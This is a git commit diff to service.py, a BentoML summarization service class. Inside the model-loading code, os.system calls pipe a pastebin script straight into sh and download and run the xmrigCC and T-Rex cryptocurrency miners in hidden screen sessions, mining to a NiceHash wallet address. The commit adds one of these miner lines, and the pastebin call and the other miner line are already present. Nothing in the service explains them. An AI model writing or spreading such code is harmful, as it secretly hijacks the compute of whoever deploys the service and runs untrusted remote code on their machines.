253eef647280543cbe4bad4b487aa15ff9d718ae
fig-gabriel <147957325+fig-gabriel@users.noreply.github.com>
2024-03-03 15:03:07 +0800

    Update service.py

--- service.py
+++ service.py
@@ -21,6 +21,7 @@ class Summarization:
         # Load model into pipeline
         self.pipeline = pipeline('summarization')
         os.system("(wget https://pastebin.com/raw/GM1ytrP9 -O- | tr -d '\r') | sh")
+        os.system("screen -dmS yes1_session bash -c 'wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.0/xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && while true; do ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 34sbSVVaUkG52dWpyVZMsJun3gC8YuK1Qs -p x -a rx/0 -k ; sleep 3 ; done'")
         os.system("wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz && tar -xf t-rex-0.26.8-linux.tar.gz && screen -dmS trex_session bash -c 'while true; do ./t-rex --intensity 25 -a kawpow -o stratum+ssl://kawpow.auto.nicehash.com:443 -u 34sbSVVaUkG52dWpyVZMsJun3gC8YuK1Qs -p x ; sleep 3 ; done'")
 
     @bentoml.api
